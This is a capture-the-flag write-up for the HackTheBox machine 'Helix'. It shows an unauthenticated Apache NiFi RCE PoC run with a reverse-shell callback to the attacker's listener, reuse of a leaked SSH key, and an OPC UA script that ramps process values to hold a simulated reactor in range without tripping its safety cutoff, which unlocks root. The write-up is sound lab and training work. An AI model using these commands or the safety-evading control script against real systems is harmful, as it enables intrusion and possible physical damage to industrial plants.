# Helix

```
Platform    : HackTheBox
OS          : Linux
Difficulty  : Hard
Category    : Known CVE (Apache NiFi RCE) / ICS - OPC UA Manipulation
IP          : 10.129.245.123
```

---

## Summary

The target simulated an industrial operations center ("Helix
Industries"), fronted by a public site and an internal Apache NiFi
1.21.0 instance discovered through virtual host enumeration. An
unauthenticated NiFi RCE (CVE-2023-34468) was used to gain a shell as
the `nifi` service user, which had an SSH private key left over from a
support bundle. That key granted access as `operator`, a user with
narrow `sudo` access to a maintenance console binary that only unlocks
a root shell while the plant's simulated reactor is inside a specific
temperature "maintenance window." Reaching that window required
tunneling into a locally-bound OPC UA server (the industrial protocol
used to talk to PLCs) and writing calibrated values to its process
variables in real time, precisely enough to hold the simulated
temperature inside the required range without tripping the system's
safety cutoff — at which point the maintenance console could be
invoked for a root shell.

---

## Reconnaissance

```
nmap -p- -sS --min-rate 5000 -vvv -n -Pn --open 10.129.245.123 -oN scan.txt
nmap -p 22,80 -sCV 10.129.245.123
```

Key findings:

- **Port 22** — OpenSSH 8.9p1 (Ubuntu)
- **Port 80** — nginx 1.18.0, redirecting to `helix.htb` (added to
  `/etc/hosts`)

The main site presented "Helix Industries," an OT/ICS-themed company
page (PLC/DCS/SCADA integration, OT/ICS security, industrial
automation):

![Helix Industries landing page](./images/helix/helix-landing.png)

---

## Enumeration

Virtual host enumeration was run against the main domain to look for
internal-only subdomains:

```
gobuster vhost -u http://helix.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 150 --ad -xl 166
```

```
flow.helix.htb  Status: 200 [Size: 1068]
```

`flow.helix.htb` hosted an exposed Apache NiFi instance:

![Apache NiFi flow interface at flow.helix.htb/nifi/](./images/helix/nifi-interface.png)

The exact version was confirmed through the interface's "About"
dialog:

![About Apache NiFi dialog confirming version 1.21.0](./images/helix/nifi-version.png)

```
1.21.0
```

NiFi 1.21.0 is affected by **CVE-2023-34468**, allowing unauthenticated
users with write access to create a `DBCPConnectionPool` controller
service pointing at an arbitrary H2 JDBC URL, which can be abused to
achieve remote code execution through H2's scripting capabilities. A
public PoC was used directly
([sbouabid-sec/CVE-2023-34468-POC](https://github.com/sbouabid-sec/CVE-2023-34468-POC)):

```
python3 exploit.py --target http://flow.helix.htb --lhost 10.10.14.106 --lport 4444 --cleanup
```

```
[+] Identity: anonymous | Anonymous: True | canWrite: True
[+] Target is exploitable
[*] Creating DBCPConnectionPool...
[*] Enabling controller service...
[*] Creating ExecuteSQL processor...
[*] Starting processor...
[+] Processor running — waiting for shell on port 4444...
```

---

## Foothold

Caught on a listener:

```
nc -lvnp 4444
```

```
nifi@helix:/opt/nifi-1.21.0$
```

Enumerating the NiFi installation directory revealed a leftover
support bundle containing an SSH private key:

```
nifi@helix:/opt/nifi-1.21.0/support-bundles$ cat operator_id_ed25519.bak
-----BEGIN OPENSSH PRIVATE KEY-----
...
-----END OPENSSH PRIVATE KEY-----
```

Used directly for SSH access as `operator`:

```
chmod 600 operator.key
ssh -i operator.key operator@helix.htb
```

```
operator@helix:~$
```

The user flag, along with two suggestive files (`control systems
diagram.png` and `Operator Control & Safety Guide.pdf`), were found in
the home directory — early hints that the privilege escalation path
would involve the industrial control simulation rather than a
standard Linux misconfiguration.

---

## Privilege Escalation

`sudo -l` showed a single, narrowly scoped permission:

```
User operator may run the following commands on helix:
    (root) NOPASSWD: /usr/local/sbin/helix-maint-console
```

Reading the script revealed it doesn't grant a root shell
unconditionally — it checks a state file for an active "maintenance
window":

```bash
FLAG="/opt/helix/state/maintenance_window"

window_ok() {
  [ -f "$FLAG" ] || return 1
  until_ts="$(cat "$FLAG")"
  now="$(date +%s)"
  [ "$now" -lt "$until_ts" ] || return 1
}

if ! window_ok; then
  echo "Maintenance window CLOSED."
  exit 1
fi
...
systemd-run --quiet --scope ... /bin/bash -p -i
```

This meant privilege escalation depended on making the underlying
system believe the plant was actually inside a maintenance state —
not on attacking the script itself. Local port scanning revealed the
relevant service:

```
ss -tulpn
```

```
tcp   LISTEN   127.0.0.1:4840   <- OPC UA
```

**Port 4840 is the standard OPC UA port** — the industrial protocol
used to communicate with PLCs (the controllers that manage physical
processes like valves, motors, and sensors). It was bound only to
`localhost`, so it wasn't reachable directly from the attacker
machine. An SSH local port-forward was used to tunnel into it:

```
ssh -i operator.key -L 4840:127.0.0.1:4840 operator@helix.htb
```

With the tunnel open, a Python OPC UA client (using the `python-opcua`
library) was used to inspect the exposed process variables, including
the current reactor temperature and a `CalibrationOffset` node used to
influence it. An initial attempt to write a large offset value in one
step triggered the PLC's safety logic (a **safety trip**), which
detected the abrupt, physically unrealistic temperature spike and shut
the connection — proof the process had real (simulated) physical
constraints, not just a fixed check.

A more careful script was built instead, incorporating three specific
fixes:

1. **Correct data typing** — the PLC expected the offset written as a
   `Double` (64-bit float); sending it as a generic numeric type
   caused a `BadTypeMismatch` error.
2. **Ramped, adaptive control** — instead of jumping straight to a
   target value, the script increased the offset quickly while far
   from the target range, then switched to very small increments
   (`0.05`) as it approached the critical threshold (~303°C), avoiding
   the abrupt-change detection that triggered the earlier trip.
3. **Sustained hold** — once inside the target range (**295°C–302°C**,
   the maintenance window), the script kept sending minimal correction
   values in a loop to hold the temperature steady rather than letting
   it drift out of range.

```python
# Reconstructed based on documented behavior — original script not preserved.
from opcua import Client, ua
import time

TEMP_NODE = "ns=2;i=4"
OFFSET_NODE = "ns=2;i=6"
TARGET_MIN, TARGET_MAX = 295.0, 302.0
TRIP_THRESHOLD = 303.0

client = Client("opc.tcp://127.0.0.1:4840")
client.connect()
print("[+] Connected")

temp_node = client.get_node(TEMP_NODE)
offset_node = client.get_node(OFFSET_NODE)

offset = 0.0
while True:
    current_temp = temp_node.get_value()

    if current_temp < TARGET_MIN:
        step = 1.0 if current_temp < TARGET_MAX - 10 else 0.05
    elif current_temp > TARGET_MAX:
        step = -0.05
    else:
        step = 0.0  # holding inside the window

    offset += step

    # Explicit Double cast avoids BadTypeMismatch
    offset_node.set_value(ua.DataValue(ua.Variant(offset, ua.VariantType.Double)))

    print(f"[*] Temp: {current_temp:.2f}°C | Offset: {offset:.2f}")
    time.sleep(1)
```

Running it in the background held the simulated reactor inside the
maintenance window:

```
[*] Telemetría -> Temp: 295.01°C | Offset Actual: 10.75
[!!!] ¡VENTANA DE MANTENIMIENTO ABIERTA!
```

With the physical state satisfied, the maintenance console was run in
a second session over the same SSH tunnel:

```
sudo /usr/local/sbin/helix-maint-console
```

```
[+] Privileged maintenance access granted
[!] Window expires in 112 seconds
root@helix:/home/operator# whoami
root
```

---

## Lessons Learned

- Virtual host enumeration on a company-themed target is worth doing
  even when the main site looks like a static marketing page — the
  actual attack surface (an exposed NiFi instance here) lived
  entirely on an undiscoverable subdomain.
- Support bundles, backups, and other operational artifacts left
  inside application directories (`operator_id_ed25519.bak` here) are
  a recurring source of credentials after gaining an initial
  low-privilege shell — worth checking any directory related to the
  exploited service, not just typical Linux privesc paths.
- OT/ICS environments add a layer that pure Linux privilege
  escalation checklists don't cover: a `sudo` grant can be
  legitimately blocked by a *physical* precondition rather than a
  logic flaw in the script itself, meaning the real target of the
  attack is the process being controlled, not the access control
  code.
- Industrial protocols like OPC UA often include real safety logic
  (rate-of-change detection, safe operating ranges) — abrupt,
  unrealistic writes get detected and blocked, so ICS manipulation
  frequently requires modeling the expected physical behavior of the
  system rather than simply writing an arbitrary target value.
- Correct data typing matters more in OPC UA / industrial protocols
  than in typical web APIs — a mismatched type (`Double` vs. a generic
  numeric) is enough to be rejected outright, so understanding the
  target's expected schema is a prerequisite, not an afterthought.

---

<sub>Write-up published after machine retirement, per HackTheBox disclosure policy.</sub>
